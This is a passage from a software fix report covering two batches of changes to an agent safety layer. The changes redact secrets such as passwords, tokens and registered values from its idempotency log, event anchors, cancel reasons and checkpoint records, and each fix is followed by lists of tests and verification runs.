  a new redactor (the default patterns and the runner's), so the shared
  default never learns a value; any other takes the runner's in. A runner
  on the default redactor changes nothing. `_transmitted_since` redacts
  with the log's redactor, and the runner redacts the strings of a
  `RolledBack` response's `not_covered` items (host text the core writes
  into the trace and the rollback's record), so a custom rollback's items
  are covered too.
- Tests: `tests/test_idempotency.py::test_the_output_in_the_file_is_redacted`
  (the file's bytes hold no key id, password or bearer token; the replay
  answers the redacted anchors without their digest, `evidence_seen`
  matching, the receipt's `Authorization` replaced); in
  `tests/test_runner_secrets.py`, the reported workflow (checkpoint,
  constrain, send, rollback) with the log on the default redactor and on
  its own (file bytes; one transmission; the rollback's item redacted; the
  run's trace, records and outputs hold neither; the default redactor
  learns nothing), a replay from the file equal to what the runner submits
  for the first answer, two anchors one after redaction (listed only when
  both were), and the runner's secrets reaching the host's and its own
  memory store (with the default patterns kept); `tests/test_redaction.py::
  test_include_takes_another_redactors_values_and_patterns`. All fail on
  4cec757's runner, log, redactor and memory store.
- Not changed: a secret in a plain member of an `Output` the run keeps
  (the receipt) stays in the run's outputs: §6.7 makes not passing one a
  host's duty (SHOULD NOT), and the runner redacts anchors and host text
  that reaches the trace and the records. The log, an audit record, now
  redacts it. Entries a log wrote before this fix keep what they hold. The
  default patterns still do not recognise a signed URL's signature (round
  2 #23): the log holds an `X-Amz-Signature` where no pattern names it, as
  the run does. The run's snapshot keeps the run's inputs as the caller
  gave them (a destination with a registered secret, here).

#### 4. The runner redacted only an Output's anchors given as a list: an Event's anchors and a tuple of anchors kept their secrets (medium; sibling of round 2 #23)

`_redact_anchors` returned any response that was not an `Output`
unchanged, and an `Output` whose `evidence_anchors` was not a list. The
core reads a tuple as an array, and copies an `Event`'s `anchors` into a
`receive` or `wait` step's output (its `evidence_anchors`, and the event
under `data` or `result`), so both reached the run's outputs, state and
snapshot with a URL's password and a registered secret. A tuple's anchors
were neither recorded in the evidence store nor logged as skipped.

- Fix (`_responses.redact_anchors`, which the runner's `_redact_anchors`
  now calls): an `Event`'s `event.anchors` are redacted as an `Output`'s
  are, and an array of anchors given as a tuple, an `Output`'s or an
  `Event`'s, is redacted and given back as a list (so the evidence store
  records it); `evidence_seen` given as a tuple is rewritten as a list is.
  Only the anchors of an `Event` are redacted, not its other content: an
  event's message is the host's, as an `Output`'s plain members are (the
  core's trace holds an event's type and drop counts only), and redacting
  it before the core reads it could change what the event's filter
  matches.
- Tests (`tests/test_runner_secrets.py`): an event's anchors as a list and
  as a tuple (outputs, trace, records, run record and snapshot hold
  neither the password nor the registered secret; the anchor is kept
  redacted without its digest, the same under `data`), an `Output`'s
  anchors as a tuple (redacted, and recorded in the evidence store, with
  and without a secret), `evidence_seen` as a tuple (the attested policy
  passes, nothing kept holds the password). All fail on 4cec757's runner;
  the control (an event's anchors with no secret kept as given) passes on
  both.
- Sibling checked: `nested_anchors` carry a nested run's step outputs,
  which were redacted when submitted; a trigger event that starts a run
  reaches no step output's anchors (the core reads `anchors` only on
  receive).

#### 5. WorkflowRunner.cancel put the cancel reason into the run's message, trace, records and snapshot unredacted (medium)

`cancel` passed `reason` to `run.cancel` as given; the core makes it the
R408 message and writes it into the `run_cancelled` event, the cancelled
records and the run record.

- Fix: `run.cancel(self._redactor.redact_text(reason)[0], now)` (a reason
  that is not a string is passed as it is, for the core to refuse); the
  docstring and the guide say so.
- Tests: `test_a_cancel_reason_is_redacted` (a URL's password and a
  registered secret: the message is the reason with both replaced, and no
  place the run keeps holds either) fails on 4cec757's runner; the control
  `test_a_cancel_reason_without_a_secret_is_kept` passes on both.
- Sibling checked: `Host.withdraw` takes the runner's own words
  (`"cancelled"`, `"timed out"`); the TypeScript package's `Run.cancel` is
  the core's own call, as Python's `_core.Run.cancel` is, below any host
  layer (the binding has no runner).

#### Documentation

SECURITY.md §1.5 (the runner's redaction of an `Event`'s and a tuple's
anchors, `not_covered` and a cancel's reason; the idempotency log; the
TypeScript decoder's message) and its binding paragraph (a nested call's
R407), the running-workflows guide (the runner's `redactor`, the log, the
cancel), the Standard Agents guide's §5.18.8 row, the runner's and the
log's docstrings, and CHANGELOG [Unreleased] Upgrading (the runner and the
log; the binding's nested R407; the package's decoder message). The
Standard's text was not changed: §6.7 already forbids a secret in an
evidence anchor, a diagnostic, a trace and an audit record, §6.4 counts a
host's log of what it did among audit records, and §5.18.8 already
requires R407 and a record of each refusal. No version changes.

#### Checks after batch 4

- Python: `pytest tests/` (6695 passed, 18 skipped), and again every file
  that reads the edited docs after the last edit (2042 passed); ruff check
  and format with CI's lists; mypy; every `tools/validate_*.py` of
  CLAUDE.md, `validate_workflows.py --strict` and every domain catalog and
  example `--strict`; `sync_skill_schemas.py --check` and the generators'
  `--check` (no fixture or vector they write changed);
  `scripts/run_conformance.py`.
- Rust: no Rust source changed, so `cargo test` was not rerun and no core
  was rebuilt.
- TypeScript: `packages/acs-core` build, check and test (2012; the three
  new vectors; the WebAssembly build reused); the binding's check and test
  (246 passed, 2 skipped; 236 plus the 10 new).
- Site: `npm run check`, `npm test` (1173).
- Old code: the three new vectors against 4cec757's `output.ts` (3 of 3
  fail), the binding's decoder test against a package built from it (fails),
  the binding's 9 nested-call tests against 4cec757's `grounded.ts` (8 fail,
  the control passes), and the 14 new Python tests against 4cec757's
  runner, log, redactor and memory store (12 fail; the 2 that pass are the
  controls: an event's anchors with no secret, a cancel reason with none).
- Probes, each under `timeout 120` and a 4 GB address-space limit, inputs
  of at most 1 MB: the reporter's four Python probes pointed at this
  worktree (the log's file holds no key id, URL password, bearer token or
  registered secret, the rollback's item is redacted; an event's and a
  tuple's anchors and a cancel's reason reach no place the run keeps with
  their secrets; the S3 signature, which no default pattern names, stays
  in the log as in the run, round 2 #23); the log's redaction of a 64 KB,
  256 KB and 1 MB output (0.04, 0.14 and 0.55 s: linear); the binding's
  arguments nested 20,000 deep (about 100 KB) refused at once. No CLI or
  nested agent was started; nothing was left running; the probe copies and
  scratch files were removed.

### Batch 5: one reported defect

One defect, reproduced by an independent verifier on 6004f78 and reproduced
again here on 5a709e9 (batch 4's commit) before any change, with the
reporter's unit probe and the verifier's end-to-end probe pointed at this
worktree (`tracker_state.json` held the GitHub token, the password
assignment, the URL's password and the registered secret). Not fixed by an
earlier batch: git log and rounds 1 to 3 checked (round 2 #10 knew `reason`
and `scope` are model-written but fixed only where the archive is written,
not what it holds; batch 4 shared the runner's redactor with the log and
the memory stores, not the tracker). Each fix has tests that fail on the
code before it (below).

#### 1. A bound checkpoint tool's model-chosen `reason` (and `scope`) was written verbatim to the checkpoint tracker's state file and archive (medium); siblings: the tracker's other text, a runner's `checkpoint` step, the binding's checkpoint ids

`create_checkpoint_recorder` passed a bound checkpoint tool's input
`reason` and `scope` (or the response's `scope`) to
`CheckpointTracker.create_checkpoint`, which kept them as given in its
records and wrote them to `tracker_state.json` and, once pruned, to the
archive. The adapter registers the recorder for every tool and redacted
its call records, diagnostics and evidence, but its tracker had no
redactor: a checkpoint is the layer's record of the call that took it
(§5.18.8: it names the call by `metadata.source` and `tool_use_id`), which
§6.7 keeps secrets out of.

- Fix at the root, the tracker (`grounded_agency/state/checkpoint_tracker.py`):
  it takes a `redactor` (default `DEFAULT_REDACTOR`; a `redactor` property
  with a setter, as `IdempotencyLog` and `MemoryStore` have) and redacts
  every string it records when it records it: a checkpoint's `reason`, its
  `scope` items and its `metadata` (structured redaction, so a member named
  for a credential is replaced too), the reason an execution boundary gives
  (`invalidated_by`) and the words that use a checkpoint (`consumed_by`).
  So the records in memory (`get_history`, `get_active_checkpoint`), the
  state file and the archive hold no secret it recognises, whoever calls
  `create_checkpoint` (the recorder, `adapter.create_checkpoint`, the
  workflow engine, a runner's host). The snapshot store captures what the
  scope names as given (the capture runs before the record is made), so a
  restore still finds the files; the checkpoint's recorded `scope`, which
  `matches_scope` and `has_checkpoint_for_scope` read, is the redacted one
  (no layer check reads it; a model that writes the scope could write
  `*`).
- The adapter builds its redactor before its tracker and gives it the
  layer's (`redactor=self.redactor`), so `secret_values` reach the
  checkpoint records too.
- Sibling, the runner: a `checkpoint` step's `scope` is the step's input
  (`Host.invoke_capability` passes it to `create_checkpoint`), so
  `WorkflowRunner._share_redactor` now gives the host's
  `checkpoint_tracker` what its redactor recognises, as it gives the log
  and the memory stores (a tracker on the shared default redactor gets one
  of its own).
- Sibling, the Standard Agents binding: a checkpoint record
  (`acs:checkpoints`) kept the `checkpoint_id` the `checkpoint` call's
  output gave, as given, and a later call's trace entry repeated it
  (`redacted` read only `error` and `evidence_anchors`, saying nothing else
  in an entry held a value a call received). `addCheckpoint`
  (`src/acs/records.ts`) records the id redacted (default patterns, the
  tool's secrets, the layer's), and `redacted` redacts an entry's
  `checkpoint_id` as well. Two ids that are one once redacted name one
  checkpoint, so a call that uses one uses both: the safe side. The
  binding records no `reason` or `scope` (the example's `label` is not
  kept). The plugin's shell hooks keep no model text in their checkpoint
  records (a commit id, generated ids, times, a call id).
- Tests (`tests/test_checkpoint_secrets.py`, 7): the reported probe (the
  recorder on a tracker with the default redactor: the checkpoint is
  taken, its reason and scope are recorded redacted, its metadata kept,
  and no file holds the password, the token or the URL's password); the
  adapter end to end through `wrap_options` (PreToolUse then PostToolUse
  with a valid output: one checkpoint, and neither the checkpoint in
  memory nor any file under the run's directory holds the four secrets,
  the registered one included; the tracker has the layer's redactor; the
  shared default never learns the value); the archive and the boundary's
  and holder's words (`max_history=1`: the archive, the history and the
  state file hold none, `invalidated_by` and `consumed_by` redacted); the
  snapshot store capturing and restoring a directory whose name holds a
  password assignment or a registered secret while the record's scope is
  redacted; a runner whose `checkpoint` step's scope holds a registered
  secret and a URL's password, with the host's tracker on the default
  redactor and on its own. Six fail on 5a709e9's Python (the reason
  recorded as given; the four secrets in the adapter's state file; three
  secrets in the archive and state file; the registered value in the
  runner's state file; two through the new `redactor` argument and
  property); the control (a reason and scope without a secret kept as
  given) passes on both. Binding (`test/grounded.test.ts`, `records a
  checkpoint id without the secrets it holds (§6.7)`: a checkpoint tool
  that returns the model's label as its id, holding a password
  assignment, a GitHub token and a value its `secrets` function gives;
  the next call uses the checkpoint, and neither `acs:checkpoints` nor
  the trace holds any of them): fails on 5a709e9's `src/acs/`.
- Not changed: checkpoints a tracker wrote before this fix keep what they
  hold, in the state file and the archive (a tracker writes back the
  records it read as the file has them; redacting every record at every
  write would cost about 16 ms per write for 100 checkpoints, against
  about 2 ms for the write); delete them once no longer needed. The
  snapshot store's manifest keeps the scope's patterns as given: a restore
  matches them (the files created since in the captured scope are
  removed), and the store holds the files' own bytes, whatever they hold
  (§4.4.1; §6.7 governs records, not restore content). A hold's holder (a
  call id) is kept as given: it is what the hold is matched by.

#### Documentation

SECURITY.md §1.5 (the tracker's redaction, the runner giving it its
secrets, the binding's checkpoint ids), the SDK guide's Secrets section,
the Standard Agents guide's secrets bullet, the running-workflows guide
(the runner's redactor reaches the host's tracker), the tracker's,
recorder's, adapter's and runner's docstrings, and CHANGELOG [Unreleased]
Upgrading (the Python `CheckpointTracker` and the runner; the binding's
checkpoint ids). The Standard's text was not changed: §6.7 already names a
safety layer's record of a call (§5.18.8), which a checkpoint the layer
records for the call that took it is. No version changes.

#### Checks after batch 5

- Python: `pytest tests/` (6702 passed, 18 skipped: 6695 plus the 7 new);
  ruff check and format with CI's lists; mypy; every `tools/validate_*.py`
  of CLAUDE.md, `validate_workflows.py --strict` and every domain catalog
  and example `--strict`; `sync_skill_schemas.py --check` and the
  generators' `--check` (no fixture or vector changed);
  `scripts/run_conformance.py`.
- Rust: no Rust source changed, so `cargo test` was not rerun and no core
  was rebuilt.
- TypeScript: the package's check and test (2012; no package source
  changed, its build reused); the binding's check and test (247 passed, 2
  skipped; 246 plus the new one).
- Site: `npm run check`, `npm test` (1173).
- Old code: the 7 new Python tests against 5a709e9's `grounded_agency/`
  (6 fail; the control passes) and the binding's new test against
  5a709e9's `src/acs/` (fails).
- Probes, each under `timeout 120` and a 4 GB address-space limit: the
  reporter's unit probe and the verifier's end-to-end probe pointed at this
  worktree hold none of the secrets in any file after the fix; redacting
  100 checkpoint records takes about 16 ms (why records written before the
  fix are not rewritten at every write). No CLI or nested agent was
  started; nothing was left running; the probe copies and scratch files
  were removed.
